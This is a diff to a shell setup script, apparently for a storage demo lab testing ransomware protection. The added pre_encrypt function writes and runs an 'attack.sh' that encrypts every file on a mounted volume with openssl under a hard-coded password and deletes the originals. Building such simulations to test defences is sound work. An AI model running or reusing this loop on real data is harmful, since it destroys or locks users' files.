@@ -152,6 +152,11 @@ copy_ads() {
   mount -t nfs 192.168.0.131:/trident_$volume_name $ads_dir
  
   cp -p /tmp/tetris/quotes/texts/* $ads_dir
+
+  mkdir -p $ads_dir/data
+  unzip -o /tmp/tetris/ads_data_0.zip -d $ads_dir/data
+  unzip -o /tmp/tetris/ads_data_1.zip -d $ads_dir/data
+  unzip -o /tmp/tetris/ads_data_2.zip -d $ads_dir/data
 }
 
 enable_arp_on_vol() {
@@ -174,6 +179,36 @@ snapshot_initial() {
   volume_name=$(kubectl get pvc -n $namespace | awk '{ print $3 }' | grep pvc | tr - _)
   
   ssh -o StrictHostKeyChecking=no -t admin@cluster1.demo.netapp.com "volume snapshot create -vserver $svm_name -volume trident_$volume_name -snapshot $snapshot_name"
+}
+
+pre_encrypt() {
+  ads_dir=/mnt/ads
+  
+  cat << EOF > /tmp/attack.sh
+cd $ads_dir/data;
+while :
+do
+        FILES=`find * -maxdepth 3 -type f \(  ! -iname "*.lckd"  ! -iname "*.key" \)`;
+        for file in $FILES;
+        do
+                CWD=`pwd`
+                encrypt_filename1=$CWD/$file.processing.lckd
+				encrypt_filename2=$CWD/$file.lckd
+                printf 'Encrypting:  %s\n' "$file"
+				`mv $CWD/$file $encrypt_filename1 2> /dev/null` && `openssl enc -aes-256-cbc -salt -in $encrypt_filename1 -out $encrypt_filename2 -pass pass:AcnlPbOAfAw= 2> /dev/null` && `rm $encrypt_filename1 2> /dev/null`
+				if [ -f "$encrypt_filename2" ]; then
+                  echo ""
+				  sleep 1
+				else
+                  echo "Encryption failed."
+				fi
+        done
+        break
+done
+EOF
+
+  chmod +x /tmp/attack.sh
+  /tmp/attack.sh
 }
 
 do_install() {
@@ -199,6 +234,7 @@ do_install() {
   copy_ads
   enable_arp_on_vol
   snapshot_initial
+  pre_encrypt
 }
 
 do_install
